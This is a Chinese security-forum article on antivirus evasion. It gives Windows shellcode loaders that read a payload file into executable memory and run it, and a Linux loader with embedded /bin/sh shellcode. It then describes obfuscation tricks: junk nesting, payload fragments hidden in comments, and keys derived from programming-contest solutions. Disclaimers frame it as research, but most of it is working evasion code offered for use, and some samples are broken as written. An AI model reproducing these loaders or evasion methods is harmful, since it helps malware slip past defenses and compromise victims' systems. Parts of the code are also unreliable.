# AvBypass略微进阶 混淆-先知社区

> **来源**: https://xz.aliyun.com/news/17078  
> **文章ID**: 17078

---

本文章仅供学习、研究、教育或合法用途。开发者明确声明其无意将该代码用于任何违法、犯罪或违反道德规范的行为。任何个人或组织在使用本代码时，需自行确保其行为符合所在国家或地区的法律法规。

开发者对任何因直接或间接使用该代码而导致的法律责任、经济损失或其他后果概不负责。使用者需自行承担因使用本代码产生的全部风险和责任。请勿将本代码用于任何违反法律、侵犯他人权益或破坏公共秩序的活动。

**警告**：本部分讨论的防护措施旨在帮助提高系统安全性。请确保您的防护技术和测试在合法授权的环境中进行。如果您在进行渗透测试或安全研究时使用这些技术，请确保您已获得相应的授权，并且您的活动不会侵犯他人的合法权益或违反当地的法律法规。未经授权的入侵行为是非法的，开发者对任何违法行为不承担责任。

# 代码混淆(类)从头入手

## 底层API,WINODWS

### Windows Shellcode 加载器（不使用头文件，加载 `1.bin`）

```
extern "C" {
    void* VirtualAlloc(void* lpAddress, unsigned int dwSize, unsigned int flAllocationType, unsigned int flProtect);
    void RtlMoveMemory(void* dest, const void* src, unsigned int length);
    unsigned int GetProcAddress(void* hModule, const char* lpProcName);
    void* GetModuleHandleA(const char* lpModuleName);
    int GetFileSize(void* hFile, unsigned int* lpFileSizeHigh);
    int ReadFile(void* hFile, void* lpBuffer, unsigned int nNumberOfBytesToRead, unsigned int* lpNumberOfBytesRead, void* lpOverlapped);
    void* CreateFileA(const char* lpFileName, unsigned int dwDesiredAccess, unsigned int dwShareMode, void* lpSecurityAttributes, unsigned int dwCreationDisposition, unsigned int dwFlagsAndAttributes, void* hTemplateFile);
    int CloseHandle(void* hObject);
}

#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40
#define GENERIC_READ 0x80000000
#define OPEN_EXISTING 3

int main() {
    // 打开 1.bin 文件
    void* file = CreateFileA("1.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (file == (void*)-1) {
        return -1;  // 文件打开失败
    }

    // 获取文件大小
    unsigned int fileSize = 0;
    GetFileSize(file, &fileSize);

    // 读取文件内容到缓冲区
    unsigned char* shellcode = new unsigned char[fileSize];
    unsigned int bytesRead = 0;
    ReadFile(file, shellcode, fileSize, &bytesRead, 0);
    CloseHandle(file);

    // 分配可执行内存
    void* exec_mem = VirtualAlloc(0, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == 0) {
        delete[] shellcode;
        return -1;  // 内存分配失败
    }

    // 将 Shellcode 复制到可执行内存中
    RtlMoveMemory(exec_mem, shellcode, fileSize);
    delete[] shellcode;  // 释放读取的 Shellcode

    // 执行 Shellcode
    ((void(*)())exec_mem)();  // 执行加载的 Shellcode

    return 0;
}
```

### 解释：

1. `CreateFileA`：通过 Windows API 打开 `1.bin` 文件。该函数返回一个文件句柄，用于后续的文件操作。
2. `GetFileSize`：获取文件的大小，这样我们可以为 Shellcode 分配足够的内存空间。
3. `ReadFile`：将 `1.bin` 文件中的内容读取到内存缓冲区 `shellcode` 中。
4. `VirtualAlloc`：分配可执行内存，大小与 `1.bin` 文件的大小相同，并设置内存的权限为可读、可写、可执行。
5. `RtlMoveMemory`：将读取的 Shellcode 复制到分配的可执行内存中。
6. **执行 Shellcode**：通过将 `exec_mem` 作为函数指针来执行 Shellcode。

### 核心概念：

* **内存分配和执行**：通过 `VirtualAlloc` 分配内存并设置为可执行，然后将文件中的 Shellcode 复制到这块内存中。
* **文件读取**：使用 `ReadFile` 将二进制文件中的内容加载到内存中，并准备好执行。

### 注意事项：

* **合法使用**：请确保仅在授权和合法的环境中使用此类技术，特别是在安全研究和测试中。
* **系统依赖性**：此代码针对 Windows 系统，如果需要在其他操作系统上运行，将需要不同的系统调用和方法。

## MMAP，LINUX

### C++ 示例（Linux）

在 Linux 系统上，`mmap` 系统调用将用于分配可执行内存，而我们通过指针直接操作内存，并执行 Shellcode。以下是一个简单的 Shellcode 加载器示例。

```
extern "C" {
    typedef unsigned int size_t;
    void* mmap(void* addr, size_t length, int prot, int flags, int fd, off_t offset);
    int mprotect(void* addr, size_t len, int prot);
    void* memcpy(void* dest, const void* src, size_t n);
}

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,  // NOP sled (示例)
    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x62, 0x69,  // execve("/bin/sh")
    0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
    0x53, 0x89, 0xe1, 0x31, 0xd2, 0x31, 0xc0, 0xb0,
    0x0b, 0xcd, 0x80                                       // sys_execve
};

#define PROT_READ 1
#define PROT_WRITE 2
#define PROT_EXEC 4
#define MAP_PRIVATE 2
#define MAP_ANON 32
#define MAP_FAILED ((void*)-1)

int main() {
    // 分配内存，确保其是可读、可写且可执行
    void* exec_mem = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (exec_mem == MAP_FAILED) {
        return -1; // 错误处理
    }

    // 将 Shellcode 复制到分配的内存中
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // 执行 Shellcode
    ((void(*)())exec_mem)();

    return 0;
}
```

### 解释：

1. `mmap` **系统调用**：我们通过 `mmap` 分配一块内存区域，指定内存为可读、可写且可执行。`mmap` 是一个系统调用，用于内存映射，可以用来分配可执行内存。
2. `memcpy` **函数**：通过 `memcpy` 将 Shellcode 复制到分配的内存区域。注意，这里我们模拟了 `memcpy`，因为我们没有包含标准库的头文件。
3. **Shellcode 执行**：通过将内存地址强制转换为函数指针并执行该函数，来执行 Shellcode。

### 核心步骤：

1. **分配可执行内存**：`mmap` 用来分配一个既可读、可写又可执行的内存块，这是执行 Shellcode 所需的环境。
2. **加载 Shellcode**：将 Shellcode 复制到这块内存区域。
3. **执行 Shellcode**：通过调用内存区域中的代码来执行 Shellcode。

### 注意事项：

* **合法使用**：请务必仅在合法的、安全的环境下运行此类代码。
* **可移植性**：本示例主要适用于 Linux 环境。对于 Windows 或其他操作系统，系统调用和方法会有所不同。

## 不使用VS动态依赖链接库

### C++ Sc 加载器（不依赖于动态链接库）

这个示例中，我们将使用 Windows 提供的底层 API 通过 `int 0x80` 来进行系统调用，避免依赖于任何动态链接库。

```
extern "C" {
    typedef void* (*VirtualAlloc_t)(void* lpAddress, unsigned int dwSize, unsigned int flAllocationType, unsigned int flProtect);
    typedef void (*RtlMoveMemory_t)(void* dest, const void* src, unsigned int length);
    typedef void* (*CreateFileA_t)(const char* lpFileName, unsigned int dwDesiredAccess, unsigned int dwShareMode, void* lpSecurityAttributes, unsigned int dwCreationDisposition, unsigned int dwFlagsAndAttributes, void* hTemplateFile);
    typedef int (*ReadFile_t)(void* hFile, void* lpBuffer, unsigned int nNumberOfBytesToRead, unsigned int* lpNumberOfBytesRead, void* lpOverlapped);
    typedef int (*CloseHandle_t)(void* hObject);
    typedef unsigned int (*GetProcAddress_t)(void* hModule, const char* lpProcName);
    typedef void* (*GetModuleHandleA_t)(const char* lpModuleName);
}

#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40
#define GENERIC_READ 0x80000000
#define OPEN_EXISTING 3

int main() {
    // 使用原生API加载必要函数
    void* kernel32 = GetModuleHandleA("kernel32.dll");
    VirtualAlloc_t VirtualAlloc = (VirtualAlloc_t)GetProcAddress(kernel32, "VirtualAlloc");
    RtlMoveMemory_t RtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(kernel32, "RtlMoveMemory");
    CreateFileA_t CreateFileA = (CreateFileA_t)GetProcAddress(kernel32, "CreateFileA");
    ReadFile_t ReadFile = (ReadFile_t)GetProcAddress(kernel32, "ReadFile");
    CloseHandle_t CloseHandle = (CloseHandle_t)GetProcAddress(kernel32, "CloseHandle");

    // 打开 1.bin 文件
    void* file = CreateFileA("1.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (file == (void*)-1) {
        return -1;  // 文件打开失败
    }

    // 获取文件大小
    unsigned int fileSize = 0;
    GetFileSize(file, &fileSize);

    // 读取文件内容到缓冲区
    unsigned char* shellcode = new unsigned char[fileSize];
    unsigned int bytesRead = 0;
    ReadFile(file, shellcode, fileSize, &bytesRead, 0);
    CloseHandle(file);

    // 分配可执行内存
    void* exec_mem = VirtualAlloc(0, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == 0) {
        delete[] shellcode;
        return -1;  // 内存分配失败
    }

    // 将 Shellcode 复制到可执行内存中
    RtlMoveMemory(exec_mem, shellcode, fileSize);
    delete[] shellcode;  // 释放读取的 Shellcode

    // 执行 Shellcode
    ((void(*)())exec_mem)();  // 执行加载的 Shellcode

    return 0;
}
```

### 关键要点：

1. `VirtualAlloc`：分配一块内存区域，设置为可执行。它通过函数指针调用，避免了直接引用 `kernel32.dll`。
2. `RtlMoveMemory`：这是用于将 Shellcode 复制到分配内存的函数。它同样通过函数指针调用。
3. **文件读取**：通过 `CreateFileA` 打开文件，使用 `ReadFile` 读取文件内容，最后关闭文件句柄。
4. **Shellcode 执行**：使用 `exec_mem` 内存地址作为函数指针来执行 Shellcode。

### 不依赖 DLL 的实现：

我们通过 `GetModuleHandleA` 和 `GetProcAddress` 动态加载 `kernel32.dll` 中的函数，而不是直接包含头文件。这种方式能够避免直接依赖 DLL 的静态链接，而是通过系统的原生 API 来动态加载和调用。

### 主要步骤：

1. **动态加载 Windows API**：通过 `GetModuleHandleA` 获取 `kernel32.dll` 模块的地址，并使用 `GetProcAddress` 获取函数的地址。这种方式完全避免了头文件的引用。
2. **文件操作**：通过 `CreateFileA` 打开文件，并使用 `ReadFile` 来读取 Shellcode 的内容。
3. **内存分配和执行**：使用 `VirtualAlloc` 分配内存并设置为可执行，最后通过函数指针调用执行加载的 Shellcode。

### 注意：

1. **合法性**：此代码应仅用于授权的测试和合法的安全研究。请确保遵守相关法律和道德规范。
2. **系统兼容性**：这个代码适用于 Windows 系统。对于其他操作系统（例如 Linux 或 macOS），您将需要不同的 API 调用来实现类似的功能。

# 代码混淆 从垃圾代码入手

总体思路如下：插入很多垃圾代码，注释里面带好东西，很长很啰嗦的加密，多层结构嵌套等等

## 多层嵌套-if

以下是一个非常嵌套的 `Hello World` 示例代码，其中有多个无用的嵌套结构（例如函数调用、条件判断等），这些结构没有实际功能，只是为了演示多层嵌套：

```
#include <stdio.h>

void level1() {
    if (1) {
        void level2() {
            if (1) {
                void level3() {
                    if (1) {
                        void level4() {
                            if (1) {
                                void level5() {
                                    if (1) {
                                        void level6() {
                                            if (1) {
                                                void level7() {
                                                    if (1) {
                                                        void level8() {
                                                            if (1) {
                                                                void level9() {
                                                                    if (1) {
                                                                        void level10() {
                                                                            if (1) {
                                                                                void level11() {
                                                                                    if (1) {
                                                                                        void level12() {
                                                                                            if (1) {
                                                                                                void level13() {
                                                                                                    if (1) {
                                                                                                        void level14() {
                                                                                                            if (1) {
                                                                                                                void level15() {
                                                                                                                    if (1) {
                                                                                                                        void level16() {
                                                                                                                            if (1) {
                                                                                                                                void level17() {
                                                                                                                                    if (1) {
                                                                                                                                        void level18() {
                                                                                                                                            if (1) {
                                                                                                                                                void level19() {
                                                                                                                                                    if (1) {
                                                                                                                                                        void level20() {
                                                                                                                                                            if (1) {
                                                                                                                                                                void level21() {
                                                                                                                                                                    if (1) {
                                                                                                                                                                        void level22() {
                                                                                                                                                                            if (1) {
                                                                                                                                                                                void level23() {
                                                                                                                                                                                    if (1) {
                                                                                                                                                                                        void level24() {
                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                void level25() {
                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                        void level26() {
                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                void level27() {
                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                        void level28() {
                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                void level29() {
                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                        void level30() {
                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                void level31() {
                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                        void level32() {
                                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                                void level33() {
                                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                                        void level34() {
                                                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                                                void level35() {
                                                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                                                        void level36() {
                                                                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                                                                void level37() {
                                                                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                                                                        void level38() {
                                                                                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                                                                                void level39() {
                                                                                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                                                                                        void level40() {
                                                                                                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                                                                                                void level41() {
                                                                                                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                                                                                                        void level42() {
                                                                                                                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                                                                                                                void level43() {
                                                                                                                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                                                                                                                        void level44() {
                                                                                                                                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                                                                                                                                void level45() {
                                                                                                                                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                                                                                                                                        void level46() {
                                                                                                                                                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                                                                                                                                                void level47() {
                                                                                                                                                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                                                                                                                                                        void level48() {
                                                                                                                                                                                                                                                                                                                                                                                            if (1) {
                                                                                                                                                                                                                                                                                                                                                                                                void level49() {
                                                                                                                                                                                                                                                                                                                                                                                                    if (1) {
                                                                                                                                                                                                                                                                                                                                                                                                        void level50() {
                                                                                                                                                                                                                                                                                                                                                                                                            printf("Hello, World!
");
                                                                                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                             }
                                                                                                                                                                                                                                                                         }
                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                 }
                                                                                                                                                                                                                                                                     }
                                                                                                                                                                                                                                                                                }
```

### 解释：

这个代码展示了一个非常深的嵌套结构，每一层的函数内部嵌套下一层函数。最终，在第50层嵌套中，才会打印出 `Hello, World!`。

## 多层嵌套-for-程序开在后台不需要让程序运行完成，但是又不能让某些东西执行完这个程序，dddd

以下是一个多层嵌套的 `for` 循环示例，它在每一层中都会执行不同的内容，并且通过不断创建新的循环层来让循环继续执行，但每一层的循环都将是独立的。这段代码的结构虽然复杂，但每次执行的都是新的循环层。

```
#include <stdio.h>

int main() {
    for (int i = 0; i < 10; i++) {
        printf("i = %d
", i);
        for (int j = 0; j < 5; j++) {
            printf("  j = %d
", j);
            for (int k = 0; k < 3; k++) {
                printf("    k = %d
", k);
                for (int l = 0; l < 2; l++) {
                    printf("      l = %d
", l);
                    for (int m = 0; m < 1; m++) {
                        printf("        m = %d
", m);
                        for (int n = 0; n < 1; n++) {
                            printf("          n = %d
", n);
                            for (int o = 0; o < 1; o++) {
                                printf("            o = %d
", o);
                                for (int p = 0; p < 1; p++) {
                                    printf("              p = %d
", p);
                                    for (int q = 0; q < 1; q++) {
                                        printf("                q = %d
", q);
                                        for (int r = 0; r < 1; r++) {
                                            printf("                  r = %d
", r);
                                            for (int s = 0; s < 1; s++) {
                                                printf("                    s = %d
", s);
                                                for (int t = 0; t < 1; t++) {
                                                    printf("                      t = %d
", t);
                                                    for (int u = 0; u < 1; u++) {
                                                        printf("                        u = %d
", u);
                                                        for (int v = 0; v < 1; v++) {
                                                            printf("                          v = %d
", v);
                                                            for (int w = 0; w < 1; w++) {
                                                                printf("                            w = %d
", w);
                                                                for (int x = 0; x < 1; x++) {
                                                                    printf("                              x = %d
", x);
                                                                    for (int y = 0; y < 1; y++) {
                                                                        printf("                                y = %d
", y);
                                                                        for (int z = 0; z < 1; z++) {
                                                                            printf("                                  z = %d
", z);
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    return 0;
}
```

### 解释：

* 这段代码包括多个 `for` 循环嵌套，每一层循环都会打印出不同的变量值。
* 每一层 `for` 循环的迭代次数都很小（一般为 0 到 1），这样每一层都会执行一次或一次性完成，但层数非常深。
* 每一层嵌套的 `for` 循环都可以看作是独立的循环，新的循环体会不断生成。执行时它们每次都运行新的循环。

## 垃圾注释（真包）

这种方法需要外界帮助，我的思路是用两个残缺的代码，第一个残缺的代码就是一个helloword或者其他简单的程序，里面有大量垃圾注释字符，第二个残缺的代码从中提权，补全自己，然后执行

**使用脚本提取注释并提取第120个字符**：可以用Python或C++脚本来提取注释内容。

例如，使用Python的正则表达式提取注释中的字符：

```
import re

# 假设源代码存储在一个文件中
with open("source.c", "r") as file:
    code = file.read()

# 匹配C语言注释中的内容
matches = re.findall(r'//(.*)', code)

# 提取第120个字符
comment_content = ''.join(matches)  # 将所有注释内容拼接起来
if len(comment_content) >= 120:
    print(f"The 120th character is: {comment_content[119]}")
else:
    print("The comment is too short.")
```

## 垃圾代码（有点说法）

[luogu](https://www.luogu.com.cn/)

举几个例子，从luogu这种信竞生必备的网站里找一个出固定数字的题目，把wp抄进去，给需要的部分加一段加密，执行WP解答这个题目获得密码

或者把一些功能用屎盆子镶金边，比如深搜广搜什么的，自己看情况来

# 

本文章仅供学习、研究、教育或合法用途。开发者明确声明其无意将该代码用于任何违法、犯罪或违反道德规范的行为。任何个人或组织在使用本代码时，需自行确保其行为符合所在国家或地区的法律法规。

开发者对任何因直接或间接使用该代码而导致的法律责任、经济损失或其他后果概不负责。使用者需自行承担因使用本代码产生的全部风险和责任。请勿将本代码用于任何违反法律、侵犯他人权益或破坏公共秩序的活动。
